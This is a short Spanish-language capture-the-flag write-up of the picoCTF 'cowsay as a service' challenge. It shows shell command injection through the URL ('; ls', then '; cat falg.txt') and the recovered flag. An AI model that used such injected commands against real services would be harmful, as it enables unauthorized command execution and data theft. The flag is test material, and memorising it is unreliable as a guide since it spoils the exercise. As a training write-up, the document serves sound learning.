## Objetivo
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)
## Solución
- Al entrar a la pagina te indica que entres al siguiente url:
```bash
https://caas.mars.picoctf.net/cowsay/{message}
```
 Probamos https://caas.mars.picoctf.net/cowsay/%7BpcicoCTF%7D
```bash
 _________
< picoCTF >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

Le colocamos un punto y coma el comando ls, por ejemplo para ver las carpetas y archivos

https://caas.mars.picoctf.net/cowsay/picoCTF; ls

Al hacer esto obtenemos la imagen de la vaca y además de la lista de archivos que contiene
```bash
 _________
< picoCTF >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock

```

Visualizamos el archivo que contiene la bandera
```bash
https://caas.mars.picoctf.net/cowsay/picoCTF;%20cat%20falg.txt

 _________
< picoCTF >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

## Notas Adicionales
## Referencias